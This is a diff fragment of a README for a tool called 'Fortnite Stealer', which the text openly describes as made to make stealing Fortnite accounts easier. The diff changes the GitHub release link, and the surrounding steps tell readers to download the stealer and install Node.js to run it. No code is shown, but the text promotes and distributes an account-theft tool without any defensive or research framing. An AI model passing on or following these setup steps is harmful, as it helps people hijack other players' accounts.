@@ -7,7 +7,7 @@ Fortnite Stealer was made by @xoidfn to make stealing Fortnite Accounts easier w
 To set up Xoid's Fortnite Stealer, follow these steps:  
 
 1. **Download the Stealer**  
-   - Head to the [Releases](https://github.com/Xoid-FNCS/Fortnite-Stealer/releases/tag/fortnite) section of this repository and download the latest version of Fortnite Stealer.  
+   - Head to the [Releases](https://github.com/Xoid-FNCS/Fortnite-Stealer/releases/tag/Xoid) section of this repository and download the latest version of Fortnite Stealer.  
 
 2. **Install Node.js**  
    - Ensure that [Node.js](https://nodejs.org) is installed on your computer. This tool requires Node.js to run.  
